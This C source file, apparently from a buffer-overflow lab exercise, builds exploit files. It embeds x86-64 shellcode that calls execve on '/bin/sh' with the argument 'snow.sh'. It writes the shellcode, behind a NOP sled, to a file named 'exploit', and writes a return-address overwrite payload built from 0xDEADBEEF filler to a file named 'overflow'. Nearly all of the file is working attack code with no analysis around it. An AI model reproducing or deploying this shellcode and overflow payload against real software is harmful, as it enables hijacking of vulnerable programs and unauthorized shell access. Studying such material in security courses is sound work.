//
// buildExploit.c
//
// - a program to create files to exploit overflow vulnerability
//
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char exploit_code[] =
    "\x55"
    "\x48\x89\xe5"
    "\x48\xc7\xc2\x00\x00\x00\x00"
    "\x52"
    "\x48\xbf\x73\x6e\x6f\x77\x2e"
    "\x73\x68\x00"
    "\x57"
    "\x48\x89\xe1"
    "\x48\xbe\x2f\x62\x69\x6e\x2f"
    "\x73\x68\x00"
    "\x56"
    "\x48\x89\xe7"
    "\x52"
    "\x51"
    "\x57"
    "\x48\x89\xe6"
    "\x48\xc7\xc0\x3b\x00\x00\x00"
    "\x0f\x05"
    "\xb8\x00\x00\x00\x00"
    "\x5d"
    "\xc3"
    "\x90"
    "\x00"
;

FILE *fp;

int main(int argc, char **argv)
{
    char buffer[1024];
    char overflow[24]="\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE"
                       "\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE"
                       "\x00\xE0\xBE\x12\x00\x00\x00\x00";
    int i, n;
    int offset;
    char nop = 0x90;

    /* Initialize buffer with 0x90 (NOP = no-op instruction) */
    memset(buffer, 0x90, 1024);

    /* Copy exploit code to the buffer to be output to exploit */
    n = sizeof(exploit_code);
    offset = 0;
    for (i=0; i<n; i++)
      buffer[i+offset] = exploit_code[i];

    /* Save the object code to the file "exploit" */
    fp = fopen("./exploit", "wb");
    fwrite(buffer, 1024, 1, fp);
    fclose(fp);

    /* Save the overflow data to the file "overflow" */
    fp = fopen("./overflow", "wb");
    fwrite(overflow, sizeof(overflow), 1, fp);
    fclose(fp);

    return 0;
}

